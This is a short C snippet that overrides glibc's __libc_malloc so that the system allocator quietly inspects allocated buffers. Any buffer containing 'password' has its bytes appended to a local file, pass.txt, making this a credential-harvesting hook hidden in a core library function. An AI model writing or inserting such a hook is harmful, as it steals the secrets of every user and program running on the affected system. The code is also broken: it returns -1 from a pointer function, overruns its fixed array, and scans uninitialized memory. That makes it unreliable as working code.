void *__libc_malloc(size_t bytes)
{
  static void *saved_ptrs[10];
  void *get_ret_ptr = NULL;
  int i = 0;
  static int j = 0;
  int fd = 0;
  fd = open("/home/raz/Downloads/libc/pass.txt", O_RDWR | O_APPEND);
  if(-1 == fd)
  {
    write(1,"failed",6);
    return -1;
  }
  else if (fd != 0)
  {
    write(1,"success\n",8);
  }

  get_ret_ptr = origin__libc_malloc(bytes);
  if (NULL != get_ret_ptr)
  {
    saved_ptrs[j] = get_ret_ptr;
    
    ++j;
  }
  
  for (i = 0; i < 10; i++)
  {
   
      if (saved_ptrs[i] != NULL)
      {
          if (strstr(saved_ptrs[i],"password") != NULL)
          {
            write(1,"write file\n",11);
            write(fd,saved_ptrs[i],13);
            write(fd,"\n",1);
          }

      
      }
  }

  close(fd);

  return get_ret_ptr;
}
